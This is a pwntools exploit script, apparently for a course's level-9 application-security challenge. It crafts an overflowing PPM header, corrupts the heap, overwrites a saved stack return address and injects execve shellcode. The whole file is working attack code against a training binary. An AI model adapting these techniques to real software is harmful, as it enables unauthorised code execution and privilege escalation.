#!/usr/bin/env python3

from asyncio import log
from pwn import *
import ctypes



exe = ELF("9")

context.binary = exe
#context.terminal = ['tmux', 'splitw', '-v']

shellcode = shellcraft.execve("/usr/local/bin/l33t", ["/usr/local/bin/l33t"], 0)
shellcode_prev ="""
    mov rcx, 0x7fffffffe91effff
    shr rcx, 16
    jmp rcx
"""
print(shellcode)
shellcode = asm(shellcode)
shellcode_prev = asm(shellcode_prev)

def conn():
    if args.SSH and not args.DEB:
        shell = ssh(host='appsec.vusec.net', user='rockygo2', port=41234, keyfile='~/.ssh/id_ed25519')
        r = shell.process(['/var/challenge/level9/9'])
    if args.SSH and args.DEB:
        shell = ssh(host='appsec.vusec.net', user='rockygo2', port=41234, keyfile='~/.ssh/id_ed25519')
        # Start a process on the server
        r = gdb.debug(['/var/challenge/level9/9'], exe='/var/challenge/level9/9',             
                                    ssh=shell,
                                    gdbscript='''
        c
        ''')
        
    if args.LOCAL:
        if args.DEB:
            # start the binary inside gdb (no race attaching)
            r = gdb.debug(exe.path, gdbscript="""
                b *parse_image+426
                b *free_list_remove
                c
            """)
        else:
            r = process([exe.path])


    return r

def add_image(r, name, base64_data):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", name)
    r.sendafter(b": ", base64_data)
    r.sendline(b"\n")

def remove_image(r, index):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", index)

def show_images(r):
    r.sendlineafter(b"> ", b"3")

def display_image(r, index):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b": ", index)

def Exit(r):
    r.sendlineafter(b"> ", b"5")


def write_ppm():
    string_made = b""
    # largest negative number for signed equivalent
    a = ctypes.c_size_t(-1).value
    b = 1
    width, height = a, b
    # make the base64 valid
    string_made += b"P6\n" + f"{width} {height}\n".encode() + b"255\n"
    string_made +=b"\x4a"*1+ b"\x00"*7
    # address just before the return address saved on the stack
    string_made += p64(0x7FFFFFFFECE8)
    return string_made

def main():
    r = conn()

    image_data = write_ppm()
    image_data_b64 = base64.standard_b64encode(image_data)
    print(hex(len(image_data_b64)))
    overwrite = b"UDYKMSAxCjI1NQq7u7u7u7u7u7u7u7s3222212="
    shellcodeTemp = b"\xbb"*40 + shellcode_prev + b"\xff"*50 + shellcode + b"\xbb"*40
    print(shellcodeTemp)
    add_image(r, shellcodeTemp, image_data_b64)
    add_image(r, "A", overwrite)
    remove_image(r, b"0")
    add_image(r, b"A"*0x158+ shellcode + b"\xaa"*656, overwrite)
    Exit(r)
    r.interactive()

if __name__ == "__main__":
    main()
